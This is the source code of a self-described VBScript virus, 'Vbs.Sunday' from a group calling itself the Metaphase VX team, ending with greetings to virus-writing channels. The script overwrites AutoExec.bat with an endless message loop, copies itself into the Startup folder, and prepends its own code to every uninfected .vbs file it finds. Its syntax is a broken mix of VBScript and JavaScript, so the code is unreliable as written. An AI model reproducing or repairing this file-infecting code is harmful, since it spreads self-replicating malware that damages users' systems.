Sunday
on error resume next
if(currentday==1) {
WSHShell.Popup("Restart your computer, there is a script error")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objSun = ObjFSO.CreateTextFile("C:\AutoExec.bat")
objSun.WriteLine("@echo off")
objSun.WriteLine("cls")
objSun.WriteLine(":MetaPhase")
objSun.WriteLine("echo [Vbs.Sunday.Virus-sw2a1-Metaphase Vx Team")
objSun.WriteLine("echo Have A Good Monday")
objSun.WriteLine("goto Metaphase")
Dim Parent
Parent = Wscript.ScriptFullName
FSO.CopyFile Parent, "c:\Start Menu\Programs\StartUp\AutoExec.bat"
}
WSHShell.Popup("Restart your computer, there is a script error")

Dim FSO, DieHardDrive, WSHShell
var WSHShell=WScript.CreateObject("WSCript.Shell")
Parent = Wscript.ScriptFullName
Set FSO = CreateObject("Scripting.FileSystemObject")
var currentdate=new Date()
var currentday=currentdate.getday()
Set CurrentFile = FSO.OpenTextFile(WScript.ScriptFullName, 1)
WriteCode = CurrentFile.Read(1669)

For Each PossibleFile In FSO.GetFolder(*.*).Files

 If UCase(FSO.GetExtensionName(PossibleFile.Name)) = "VBS" Then
  Set InfectedFile = FSO.OpenTextFile(PossibleFile.Path, 1 )
  
Marker = InfectedFile.Read(6)
  InfectedFile.Close
  

  If Marker <> "Sunday" Then
  Set InfectedFile = FSO.OpenTextFile(PossibleFile.Path, 1 )  
  PrePend = InfectedFile.ReadAll
  InfectedFile.Close 
  PrePend = WriteCode & PrePend
 
  Set InfectedFile = FSO.OpenTextFile(PossibleFile.Path, 2)
   InfectedFile.Write PrePend
   InfectedFile.Close
  end if
 end if
next
If (currentday==7) {
WSHShell.PopUp("Have A Great Sunday!, MVXTM")
WSHShell.PopUp("Greets in no particular order")
WSHShell.PopUp("Everyone in #vir,#virus,Metal_,VXF,Pawbs,Raid,SlageHamm,CYoda")
WSHShell.PopUp("All of Metaphase, especially Knowdeth :)")
Else wscript.run "Sunday.vbs"
end if
	